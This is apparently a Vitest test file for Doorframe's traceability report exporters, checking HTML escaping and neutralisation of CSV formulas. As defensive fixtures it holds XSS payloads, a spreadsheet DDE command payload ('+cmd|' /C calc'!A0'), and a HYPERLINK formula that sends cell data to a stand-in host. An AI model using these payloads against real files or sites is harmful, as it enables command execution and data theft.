import { describe, expect, it } from "vitest";
import fs from "node:fs";
import path from "node:path";
import type { Finding, ProjectData } from "@doorframe/core";
import { compareRequirementBaselines } from "@doorframe/analyzers";
import { parseJiraCsv, parseJUnitXml, parseRequirementsCsv } from "@doorframe/parsers";
import {
  buildProjectDataFromImportedRecords,
  defaultJiraCsvMapping,
  defaultRequirementsCsvMapping
} from "@doorframe/storage";
import { generateHtmlTraceabilityReport } from "./html";
import { generateMarkdownTraceabilityReport } from "./markdown";
import { buildJsonReport, generateJsonReport } from "./json";
import { csvCell, generateTraceabilityMatrixCsv } from "./csv";
import { generateBaselineDiffHtmlReport, type BaselineDiffRecordChanges } from "./baseline-diff-report";
import { categoryLabel, severityLabel, sourceTypeLabel } from "./labels";
import { matrixRows, summarizeReport, summarizeReportFromRows } from "./shared";

function fixture(): ProjectData {
  const now = "2026-01-01T00:00:00.000Z";
  return {
    project: { id: "p1", name: "Demo", createdAt: now, updatedAt: now },
    requirements: [
      {
        id: "r1",
        projectId: "p1",
        externalId: "REQ-1",
        title: "Display status",
        text: "The system shall display status.",
        source: "requirements-csv",
        status: "Approved",
        verificationMethod: "Test",
        createdAt: now,
        updatedAt: now
      }
    ],
    workItems: [
      {
        id: "w1",
        projectId: "p1",
        externalId: "FG-1",
        title: "Implement status",
        status: "Done",
        source: "jira-csv",
        createdAt: now,
        updatedAt: now
      }
    ],
    testCases: [
      {
        id: "t1",
        projectId: "p1",
        externalId: "Suite.testStatus",
        name: "testStatus",
        status: "passed",
        source: "junit-xml",
        createdAt: now,
        updatedAt: now
      }
    ],
    traceLinks: [
      {
        id: "l1",
        projectId: "p1",
        sourceType: "requirement",
        sourceId: "r1",
        targetType: "workItem",
        targetId: "w1",
        linkType: "implements",
        confidence: 0.85,
        source: "jira-csv",
        createdAt: now,
        updatedAt: now
      },
      {
        id: "l2",
        projectId: "p1",
        sourceType: "requirement",
        sourceId: "r1",
        targetType: "testCase",
        targetId: "t1",
        linkType: "verifies",
        confidence: 0.8,
        source: "junit-xml",
        createdAt: now,
        updatedAt: now
      }
    ],
    findings: [],
    importBatches: []
  };
}

describe("report formats", () => {
  it("renders HTML with the requirement and links", () => {
    const html = generateHtmlTraceabilityReport(fixture());
    expect(html).toContain("REQ-1");
    expect(html).toContain("FG-1");
    expect(html).toContain("testStatus");
    expect(html).toContain("Executive Summary");
    expect(html).toContain("Traceability Matrix");
    expect(html).toContain("Appendix");
  });

  it("shows the Doorframe version only when one is provided", () => {
    expect(generateHtmlTraceabilityReport(fixture(), { version: "9.8.7" })).toContain("Doorframe version: 9.8.7");
    expect(generateHtmlTraceabilityReport(fixture())).not.toContain("Doorframe version");
    expect(generateHtmlTraceabilityReport(fixture(), { version: "<b>1</b>" })).toContain("Doorframe version: &lt;b&gt;1&lt;/b&gt;");
  });

  it("escapes unsafe HTML and does not reference external resources", () => {
    const unsafe = fixture();
    unsafe.project.name = "<script>alert(1)</script>";
    unsafe.requirements[0].title = "<img src=x onerror=alert(1)>";

    const html = generateHtmlTraceabilityReport(unsafe);

    expect(html).toContain("&lt;script&gt;alert(1)&lt;/script&gt;");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).not.toMatch(/<script\b/i);
    expect(html).not.toMatch(/https?:\/\//i);
    expect(html).not.toMatch(/@import/i);
  });

  it("renders the Falcon demo project with expected counts and sections", () => {
    const demoDir = path.join(process.cwd(), "examples", "falcon-telemetry-gateway");
    const requirements = parseRequirementsCsv(
      fs.readFileSync(path.join(demoDir, "sample-requirements-baseline-b.csv"), "utf8"),
      defaultRequirementsCsvMapping
    );
    const jira = parseJiraCsv(
      fs.readFileSync(path.join(demoDir, "sample-jira.csv"), "utf8"),
      defaultJiraCsvMapping
    );
    const junit = parseJUnitXml(fs.readFileSync(path.join(demoDir, "sample-junit.xml"), "utf8"));
    const data = buildProjectDataFromImportedRecords({
      projectName: "Falcon Telemetry Gateway",
      requirements: requirements.records,
      workItems: jira.records,
      testCases: junit.records
    });

    const html = generateHtmlTraceabilityReport(data);

    expect(data.requirements).toHaveLength(42);
    expect(data.workItems).toHaveLength(31);
    expect(data.testCases).toHaveLength(58);
    expect(data.findings).toHaveLength(19);
    expect(html).toContain("Falcon Telemetry Gateway");
    expect(html).toContain("Weak Requirement Language");
    expect(html).toContain("Closed Work Without Passing Tests");
    expect(html).toContain("REQ-003");
  });

  it("renders Markdown tables", () => {
    const md = generateMarkdownTraceabilityReport(fixture());
    expect(md).toContain("# Doorframe Traceability Report");
    expect(md).toContain("| REQ-1 |");
    expect(md).toContain("FG-1");
  });

  it("builds a JSON report whose snapshot can round-trip", () => {
    const report = buildJsonReport(fixture());
    expect(report.summary.requirements).toBe(1);
    expect(report.matrix[0].workItems).toEqual(["FG-1"]);
    expect(report.snapshot.requirements).toHaveLength(1);
    expect(() => JSON.parse(generateJsonReport(fixture()))).not.toThrow();
  });

  it("renders a CSV matrix", () => {
    const csv = generateTraceabilityMatrixCsv(fixture());
    const lines = csv.split("\n");
    expect(lines[0]).toContain("Requirement ID");
    expect(lines[1]).toContain("REQ-1");
    expect(lines[1]).toContain("FG-1");
  });
});

function finding(overrides: Partial<Finding>): Finding {
  const now = "2026-01-01T00:00:00.000Z";
  return {
    id: "f1",
    projectId: "p1",
    severity: "error",
    category: "missing_verification",
    title: "Finding",
    description: "Description",
    entityType: "requirement",
    entityId: "r1",
    createdAt: now,
    updatedAt: now,
    ...overrides
  };
}

describe("HTML report labels", () => {
  it("counts findings as errors, warnings, and info, matching the web app", () => {
    const data = fixture();
    data.findings = [
      finding({ id: "f1", severity: "error", category: "closed_work_without_verification", entityType: "workItem", entityId: "w1" }),
      finding({ id: "f2", severity: "warning", category: "weak_wording" }),
      finding({ id: "f3", severity: "warning", category: "missing_work_trace" }),
      finding({ id: "f4", severity: "info", category: "duplicate_candidate" })
    ];

    const html = generateHtmlTraceabilityReport(data);

    expect(html).toContain("<strong>1</strong>Errors</div>");
    expect(html).toContain("<strong>2</strong>Warnings</div>");
    expect(html).toContain("<strong>1</strong>Info</div>");
    expect(html).not.toMatch(/<\/strong>(High|Medium|Low)<\/div>/);
    expect(html).toContain("<td>Error</td>\n<td>Closed work without verification</td>");
    expect(html).not.toContain("closed_work_without_verification");
    expect(html).toContain("Duplicate candidate");
  });

  it("shows readable import source types", () => {
    const data = fixture();
    data.importBatches = [
      { id: "b1", projectId: "p1", sourceType: "junit-xml", filename: "results.xml", importedAt: "2026-01-01T00:00:00.000Z", recordCount: 1, errors: [] },
      { id: "b2", projectId: "p1", sourceType: "custom-tool", filename: "other.txt", importedAt: "2026-01-01T00:00:00.000Z", recordCount: 1, errors: [] }
    ];

    const html = generateHtmlTraceabilityReport(data);

    expect(html).toContain("<td>JUnit XML</td>");
    expect(html).toContain("<td>custom-tool</td>");
    expect(html).not.toContain("<td>junit-xml</td>");
  });

  it("maps stored values to labels", () => {
    expect(severityLabel("error")).toBe("Error");
    expect(severityLabel("info")).toBe("Info");
    expect(categoryLabel("missing_work_trace")).toBe("Missing work trace");
    expect(sourceTypeLabel("requirements-csv")).toBe("Requirements CSV");
    expect(sourceTypeLabel("reqifz")).toBe("ReqIFZ");
  });
});

describe("CSV formula injection", () => {
  it("writes cells that would start a spreadsheet formula as text", () => {
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(csvCell("-2+3")).toBe("'-2+3");
    expect(csvCell("@SUM(1+1)")).toBe("'@SUM(1+1)");
    expect(csvCell("\tvalue")).toBe("'\tvalue");
    expect(csvCell("\rvalue")).toBe(`"'\rvalue"`);
    expect(csvCell('=HYPERLINK("http://example.invalid","x")')).toBe(`"'=HYPERLINK(""http://example.invalid"",""x"")"`);
  });

  it("leaves ordinary cells unchanged", () => {
    expect(csvCell("REQ-1")).toBe("REQ-1");
    expect(csvCell("Display status, quickly")).toBe('"Display status, quickly"');
    expect(csvCell("3")).toBe("3");
    expect(csvCell("")).toBe("");
    expect(csvCell("a=b")).toBe("a=b");
  });

  it("neutralises imported titles, statuses, and test names in the matrix export", () => {
    const data = fixture();
    data.requirements[0].title = '=HYPERLINK("http://example.invalid/?d="&B3,"Open spec")';
    data.requirements[0].status = "@Approved";
    data.testCases[0].name = "+cmd|' /C calc'!A0";

    const [, row] = generateTraceabilityMatrixCsv(data).split("\n");

    expect(row).toBe(
      `REQ-1,"'=HYPERLINK(""http://example.invalid/?d=""&B3,""Open spec"")",'@Approved,Test,FG-1,'+cmd|' /C calc'!A0 (passed),0,0`
    );
  });
});

describe("matrix rows", () => {
  it("follows links recorded in either direction and keeps findings in report order", () => {
    const data = fixture();
    data.traceLinks[0] = { ...data.traceLinks[0], sourceType: "workItem", sourceId: "w1", targetType: "requirement", targetId: "r1" };
    data.findings = [
      finding({ id: "f1", entityType: "testCase", entityId: "t1", title: "Test finding" }),
      finding({ id: "f2", entityType: "requirement", entityId: "r1", title: "Requirement finding" }),
      finding({ id: "f3", entityType: "workItem", entityId: "w1", title: "Work finding" }),
      finding({ id: "f4", entityType: "requirement", entityId: "other", title: "Unrelated finding" })
    ];

    const [row] = matrixRows(data);

    expect(row.workItems.map((item) => item.externalId)).toEqual(["FG-1"]);
    expect(row.testCases.map((item) => item.name)).toEqual(["testStatus"]);
    expect(row.findings.map((item) => item.title)).toEqual(["Test finding", "Requirement finding", "Work finding"]);
    expect(summarizeReportFromRows(data, [row])).toEqual(summarizeReport(data));
  });
});

describe("baseline diff report", () => {
  const diffReport = () =>
    compareRequirementBaselines({
      baselineAName: "Baseline A",
      baselineBName: "Current state",
      requirementsA: [
        { externalId: "REQ-1", title: "Status", text: "The system shall display status within 5 seconds.", status: "Approved", source: "requirements-csv" },
        { externalId: "REQ-2", title: "Old", text: "Removed requirement.", source: "requirements-csv" }
      ],
      requirementsB: [
        { externalId: "REQ-1", title: "Status", text: "The system shall display status within 2 seconds.", status: "Changed", source: "requirements-csv" },
        { externalId: "REQ-3", title: "New <b>", text: "Added requirement.", source: "requirements-csv" }
      ]
    });

  const changes: BaselineDiffRecordChanges = {
    newFindings: [{ category: "missing_work_trace", severity: "warning", title: "REQ-3 has no linked work item" }],
    resolvedFindings: [{ category: "closed_work_without_verification", severity: "error", title: "FG-1 is closed without passing verification" }],
    addedLinks: ["REQ-1 → FG-2 (implements)"],
    removedLinks: ["REQ-2 → FG-1 (implements)"],
    workItemsAdded: ["FG-2"],
    workItemsRemoved: [],
    testsAdded: ["Suite.testNew"],
    testsRemoved: ["Suite.testOld"],
    testStatusChanges: [{ externalId: "Suite.testStatus", before: "failed", after: "passed" }]
  };

  it("names the project and both snapshots", () => {
    const html = generateBaselineDiffHtmlReport(diffReport(), { projectName: "Falcon <Gateway>", recordChanges: changes });

    expect(html).toContain("<title>Doorframe Baseline Diff – Falcon &lt;Gateway&gt;</title>");
    expect(html).toContain('<p class="meta">Project: Falcon &lt;Gateway&gt;</p>');
    expect(html).toContain("Changes from Baseline A to Current state");
    expect(html).not.toContain("Falcon <Gateway>");
  });

  it("includes the findings, work item, test, and trace link changes shown on the Baselines page", () => {
    const html = generateBaselineDiffHtmlReport(diffReport(), { projectName: "Falcon", recordChanges: changes });

    const tiles = Array.from(html.matchAll(/<div class="metric"><strong>([^<]*)<\/strong>([^<]*)<\/div>/g), (match) => [
      match[2],
      match[1]
    ]);
    expect(tiles).toEqual([
      ["Requirements added", "1"],
      ["Requirements removed", "1"],
      ["Requirements changed", "1"],
      ["Tests added / removed / status changed", "1 / 1 / 1"],
      ["New findings", "1"],
      ["Resolved findings", "1"],
      ["Work items added / removed", "1 / 0"],
      ["Trace links added / removed", "1 / 1"],
      ["High-concern changes", "1"],
      ["Requirements before", "2"],
      ["Requirements after", "2"]
    ]);
    expect(html).toContain("<h2>New findings</h2>");
    expect(html).toContain("REQ-3 has no linked work item");
    expect(html).toContain("<td>Missing work trace</td>");
    expect(html).toContain('<span class="pill bad">Error</span>');
    expect(html).toContain("<h2>Resolved findings</h2>");
    expect(html).toContain("<td>Suite.testStatus</td><td>failed</td><td>passed</td>");
    expect(html).toContain("<h2>Work item changes (1 added, 0 removed)</h2>");
    expect(html).toContain("<tr><td>Added</td><td>FG-2</td></tr>");
    expect(html).toContain("<h2>Test changes (1 added, 1 removed)</h2>");
    expect(html).toContain("<tr><td>Removed</td><td>Suite.testOld</td></tr>");
    expect(html).toContain("<h2>Trace link changes (1 added, 1 removed)</h2>");
    expect(html).toContain("<tr><td>Added</td><td>REQ-1 → FG-2 (implements)</td></tr>");
    expect(html).toContain("<h2>Removed requirements</h2>");
    expect(html).toContain("New &lt;b&gt;");
    expect(html).toContain("<strong>Status:</strong>");
    expect(html).not.toMatch(/<(script|link|img)\b|https?:\/\/|@import/i);
  });

  it("says when nothing changed", () => {
    const unchanged = compareRequirementBaselines({
      baselineAName: "A",
      baselineBName: "B",
      requirementsA: [{ externalId: "REQ-1", title: "Same", text: "Same text.", source: "requirements-csv" }],
      requirementsB: [{ externalId: "REQ-1", title: "Same", text: "Same text.", source: "requirements-csv" }]
    });
    const none: BaselineDiffRecordChanges = {
      newFindings: [],
      resolvedFindings: [],
      addedLinks: [],
      removedLinks: [],
      workItemsAdded: [],
      workItemsRemoved: [],
      testsAdded: [],
      testsRemoved: [],
      testStatusChanges: []
    };

    expect(generateBaselineDiffHtmlReport(unchanged, { recordChanges: none })).toContain("No differences between these snapshots.");
  });

  it("covers requirement changes only when no record changes are given, as in the CLI file comparison", () => {
    const html = generateBaselineDiffHtmlReport(diffReport());

    expect(html).toContain("<title>Doorframe Baseline Diff</title>");
    expect(html).not.toContain("Project:");
    expect(html).toContain("Requirements added</div>");
    expect(html).not.toContain("New findings");
    expect(html).not.toContain("Trace link changes");
    expect(html).not.toContain("No differences between these snapshots.");
  });
});
